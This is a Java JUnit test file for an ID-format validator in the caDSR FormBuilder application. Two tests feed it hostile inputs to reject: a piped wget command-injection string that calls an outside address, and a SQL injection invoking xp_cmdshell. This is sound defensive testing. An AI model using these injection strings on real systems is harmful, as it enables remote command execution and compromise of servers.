package gov.nih.nci.ncicb.cadsr.formbuilder.struts.actions;

import static org.junit.Assert.*;

import org.junit.Test;

public class FormBuilderActionUtilsTest {

	@Test
	public void testValidateIdSeqFormatNull() {
		assertFalse(FormBuilderActionUtils.validateIdSeqFormat(null));
	}
	@Test
	public void testValidateIdSeqFormatEmpty() {
		assertFalse(FormBuilderActionUtils.validateIdSeqFormat("   "));
	}
	@Test
	public void testValidateIdSeqFormatGood() {
		assertTrue(FormBuilderActionUtils.validateIdSeqFormat("E593F10C-3186-508C-E040-BB89AD4324A0"));
	}
	@Test
	public void testValidateIdSeqFormatBad() {
		assertFalse(FormBuilderActionUtils.validateIdSeqFormat("|wget http://10.133.98.121:55072/AppScanMsg.html?varId=188|echo "));
	}
	@Test
	public void testValidateIdSeqFormatBad1() {
		assertFalse(FormBuilderActionUtils.validateIdSeqFormat(" exec master..xp_cmdshell 'ver'--"));
	}
}
